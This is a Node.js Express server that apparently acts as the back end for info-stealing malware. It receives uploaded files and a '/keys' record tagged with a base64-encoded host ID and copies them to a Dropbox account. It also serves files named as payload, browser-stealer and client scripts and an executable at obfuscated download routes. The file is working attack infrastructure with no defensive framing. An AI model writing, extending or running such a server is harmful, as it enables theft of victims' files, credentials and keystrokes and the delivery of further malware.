const express = require('express')
const multer = require('multer')
const bodyParser = require('body-parser')
const Dropbox = require('dropbox').Dropbox;
const fs = require('fs')

const app = express()
const port = 3000

app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

const storage = multer.diskStorage({
  destination: (req, file, cb) => {
    cb(null, 'uploads/');
  },
  filename: (req, file, cb) => {
    cb(null, Date.now() + '-' + file.originalname);
  },
});

const upload = multer({ storage });
const dbx = new Dropbox({ accessToken: 'Your Token' });

const n = (str) => Buffer.from(str, 'utf8').toString('base64')

const checkFolder = async (str) => {
  const response = await dbx.filesListFolder({ path: '' });
  if(response.entries)
  return response.entries.some(entry => entry.name === str);
  else 
    return false;
}

app.get('/', (request, response) => {
  response.send('Hello World!')
})

app.post('/uploads', upload.array('multi_file'), async (req, res) => {
  if(req.files.length) {
    let path_folder = n(req.body.hid);
    if(!checkFolder(path_folder))
    await dbx.filesCreateFolderV2({ path: '/'+ path_folder })

    for(var i=0; i<req.files.length; i++) {
      var file = req.files[i];
      await dbx.filesUpload({ path: `/${path_folder}/${file.originalname}`, contents: fs.createReadStream(file.path) })
    }

    console.log("Upload Finished");
  }
})

app.post('/keys', async (req,res) => {

  let path_folder = n(req.body.hid);
  if(!checkFolder(path_folder))
  await dbx.filesCreateFolderV2({ path: '/'+ path_folder })

  const data = JSON.stringify(req.body, null, 2);
  const fileName = n(req.body.ss+req.body.ts);
  fs.writeFileSync("uploads/"+fileName, data);

  await dbx.filesUpload({ path: `/${path_folder}/${fileName}`, contents: fs.createReadStream("uploads/"+fileName) })
})

app.get('/pdown', (req, res) => {
  const file = './assets/p.zi';
  res.download(file);
})

app.get('/adc/default', (req,res) => {
  const file = './assets/any_default.py';
  res.download(file);
})

app.get('/any', (req, res) => {
  const file = './assets/a.exe';
  res.download(file);
})

app.get('/payload/VGVhMG00', (req,res) => {
  const file = './assets/pay_default.py';
  res.download(file);
})

app.get('/brow/VGVhMG00', (req,res) => {
  const file = './assets/brow_default.py';
  res.download(file);
})

app.get('/client/VGVhMG00', (req, res) => {
  const file = './assets/main_VGVhMG00.py';
  res.download(file);
})

app.listen(port, () => {
  console.log(`Example app listening at http://localhost:${port}`)
})